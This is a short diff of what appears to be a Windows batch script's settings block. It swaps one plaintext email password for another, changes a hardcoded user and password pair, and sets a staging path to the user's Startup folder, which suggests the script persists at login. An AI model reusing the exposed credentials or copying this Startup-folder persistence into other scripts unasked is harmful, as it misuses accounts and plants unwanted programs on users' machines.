@@ -2,9 +2,9 @@
 
 REM Custom
 SET email=blabla.97@internet.ru
-SET emailp=NoShitSherlock1036!
-SET user=helpe
-SET p=helpe
+SET emailp=zc4qT8QwbaKsxrJUjxym
+SET user=helpf
+SET p=helpf
 
 SET stage_path="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 SET init_path=%cd%
